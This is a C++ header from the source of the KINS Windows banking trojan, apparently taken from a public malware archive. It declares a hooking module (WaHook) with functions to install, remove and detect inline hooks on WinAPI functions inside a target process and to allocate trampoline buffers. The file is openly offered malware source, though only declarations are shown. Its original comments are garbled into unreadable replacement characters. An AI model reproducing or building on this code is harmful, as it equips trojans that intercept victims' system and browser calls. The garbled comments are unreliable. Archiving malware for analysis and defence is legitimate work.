/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� WinAPI.
*/
#pragma once

namespace WaHook
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������� ��� _hook().

    IN functionForHook  - ��������� �� �������, ������� ����� �����������.
    IN originalFunction - �����, �� �������� ��� �������� ������ ���������� �������, ���� �����
                          ���������� �������� ��� ������ ������������ ������� ����� ��������� ����.
  */
  typedef void (*HOTPATCHCALLBACK)(const void *functionForHook, const void *originalFunction);
  
  /*
    ��������� ����.

    IN process             - �������, � ������� ���������� �����������.
    IN OUT functionForHook - ��������� �� �������, ������� ����� �����������.
    IN hookerFunction      - ��������� �� ����� �������.
    OUT originalFunction   - �����, �� �������� ����� �������� ������ ���������� �������, ���� �����
                             ���������� �������� ��� ������ ������������ ������� ����� ���������
                             ����.
    IN hotPatchCallback    - �������, ������� ���������� ���������� ����� ������� ���� �
                             ������������ �������.
    
    Return                 - ������ ������ ���������� �� ������ originalFunction, ��� 0 � ������
                             ������.
  */
  DWORD _hook(HANDLE process, void *functionForHook, void *hookerFunction, void *originalFunction, HOTPATCHCALLBACK hotPatchCallback);

  /*
    ������ ����.

    IN process             - �������, � ������� ���������� �����������.
    IN OUT functionForHook - ��������� �� ������������ �������.
    IN originalFunction    - ����� �� �������� �������� ����������� ������.
    IN size                - ������ originalFunction.

    Return                 - true - � ������ ������,
                             false - � ������ ������.
  */
  bool _unhook(HANDLE process, void *hookedFunction, void *originalFunction, DWORD size);

  /*
    ��������� �������� �� ������� ������������, �������� ������ ������.

    IN process  - �������
    IN function - �������.

    Return      - true - �����������,
                  false - �� �����������.
  */
  bool _isHooked(HANDLE process, void *function);
  
  /*
    �������� ������ ������, ���� ����� ������� �������� ��������� ������������ �������.
    
    IN process      - �������, � ������� ���������� �����������.
    IN maxFunctions - ��������� ���������� �������, ������� ����� �����������.
    
    Return          - �����, ��� NULL � ������ ������.
  */
  void *_allocBuffer(HANDLE process, DWORD maxFunctions);
};
